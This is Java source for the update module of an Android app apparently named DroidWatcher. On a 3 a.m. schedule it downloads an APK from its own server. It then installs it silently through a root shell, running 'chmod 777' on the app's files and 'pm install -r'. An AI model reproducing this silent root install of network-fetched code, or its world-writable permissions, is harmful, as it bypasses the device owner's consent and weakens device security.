package com.droidwatcher.modules;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.ref.WeakReference;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.acra.ACRA;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import com.droidwatcher.Debug;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.receivers.UpdateBroadcastReceiver;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.Message;

public class UpdateModule {	
	private Context mContext;
	private SettingsManager mSettings;
	private PendingIntent mPendingIntent;
	private PackageInfo mPackageInfo;
	private static MyHandler sHandler;
	
	public static final String ACTION_UPDATE = "action_dw_update";
	
	private static final long UPDATE_INTERVAL = 24 * 60 * 60 * 1000L;
	private static final int UPDATE_REQUEST_CODE = 395722;
	
	public static final int START_UPDATE = 1;
	
	public UpdateModule(Context context){
		mContext = context;
		mSettings = new SettingsManager(context);
		sHandler = new MyHandler(this);
		try {
			mPackageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
		} catch (NameNotFoundException e) {
			Debug.exception(e);
			mPackageInfo = null;
		}
	}
	
	public void start(){
		AlarmManager alarmManager = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
		Intent intent = new Intent(mContext, UpdateBroadcastReceiver.class);
		intent.setAction(ACTION_UPDATE);
		mPendingIntent = PendingIntent.getBroadcast(mContext, UPDATE_REQUEST_CODE, intent, PendingIntent.FLAG_CANCEL_CURRENT);
		Calendar calendar = Calendar.getInstance();
		if (calendar.get(Calendar.HOUR_OF_DAY) >= 3) {
			calendar.add(Calendar.DAY_OF_MONTH, 1); // if nowtime after 3:00, schedule update to the next day;
		}
		calendar.set(Calendar.HOUR_OF_DAY, 3);
		calendar.set(Calendar.MINUTE, 0);
		calendar.set(Calendar.SECOND, 0);
	    alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), UPDATE_INTERVAL, mPendingIntent);
	    Debug.i("[UpdateModule] Shedule update at " + SimpleDateFormat.getDateTimeInstance().format(calendar.getTime()));
	    
	    File f = new File(FileUtil.getFullPath(mContext, "update.apk"));
	    f.delete();
	}
	
	public void dispose(){
		try {
			if (mPendingIntent != null) {
				mPendingIntent.cancel();
				AlarmManager alarmManager = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
				alarmManager.cancel(mPendingIntent);
				mPendingIntent = null;
			}
			
			sHandler = null;
			
		} catch (Exception e) {
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private void installUpdate(){
		try {
			UpdateCommand command = new UpdateCommand(0,
				"chmod 777 " + FileUtil.getFullPath(mContext, "*"),
				"pm install -r " + FileUtil.getFullPath(mContext, "update.apk"),
				"pm enable com.droidwatcher");//,
				//"reboot");
			
			RootTools.getShell(true).add(command);//.waitForFinish();
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private void downloadUpdate(String fileName) throws Exception{
		URL url = new URL(ServerMessanger.SERVER_ADDRESS + "files/" + fileName);
        URLConnection connection = url.openConnection();
        connection.connect();
        
        String path = FileUtil.getFullPath(mContext, "update.apk");
        File oldFile = new File(path);
        if (oldFile.exists()) {
			oldFile.delete();
		}

        // download the file
        InputStream input = new BufferedInputStream(url.openStream());
        OutputStream output = new FileOutputStream(path);

        byte data[] = new byte[1024];
        int count;
        while ((count = input.read(data)) != -1) {
            output.write(data, 0, count);
        }

        output.flush();
        output.close();
        input.close();
	}
	
	private JSONObject getCurrentVersionInfo() throws Exception{
		HttpGet request = new HttpGet(ServerMessanger.SERVER_ADDRESS + "Ver?ver=" + mPackageInfo.versionCode);
		HttpClient client = new DefaultHttpClient();		
		request.setHeader("Content-type", "application/json; charset=UTF-8");
		
		HttpResponse response = client.execute(request);
		if (response != null){
			HttpEntity entity = response.getEntity();
			
			if (entity != null) {
				String data = EntityUtils.toString(entity, "UTF-8");
                return new JSONObject(data);
            }
		}
		
		return null;
	}
	
	private Boolean networkAvailable(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
	
	private void handleMessage(Message msg){
		if (msg.what == START_UPDATE) {
			if (mSettings.isAutoupdateEnabled()) {
				new UpdateThread().start();
			}
		}
	}
	
	public static void message(int what){
		if (sHandler != null) {
			sHandler.sendEmptyMessage(what);
		}
	}
	
	private class UpdateThread extends Thread{
		@Override
		public void run() {
			if (!RootTools.isRootAvailable() || !RootTools.isAccessGiven()) {
				return;
			}
			
			if (!networkAvailable()) {
				return;
			}
			
			Debug.i("[UpdateModule] Start update");
			
			try {
				JSONObject jVersionInfo = getCurrentVersionInfo();
				if (jVersionInfo == null) {
					return;
				}
				
				int serverVersion = jVersionInfo.optInt("version", mPackageInfo.versionCode);
				
				if (serverVersion <= mPackageInfo.versionCode) {
					return;
				}
				
				downloadUpdate(jVersionInfo.getString("file"));
				installUpdate();
				
			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
			}
		}
	}
	
	private static class MyHandler extends Handler{
		private final WeakReference<UpdateModule> mModule;
		
		MyHandler(UpdateModule module) {
	        mModule = new WeakReference<UpdateModule>(module);
	    }
		
		@Override
        public void handleMessage(Message msg) {
			UpdateModule module = mModule.get();
			if (module != null) {
				module.handleMessage(msg);
			}
		}
	}
	
	private class UpdateCommand extends CommandCapture{				
		public UpdateCommand(int i, String... commands) {
			super(i, commands);
		}

		@Override
		public void commandCompleted(int id, int exitcode) {
			Debug.i("[UpdateModule] Update finished");
			
		}
		
		@Override
		public void commandTerminated(int id, String reason) {
			super.commandTerminated(id, reason);
			
			ACRA.getErrorReporter().handleSilentException(new Exception(reason));
		}
	}
}
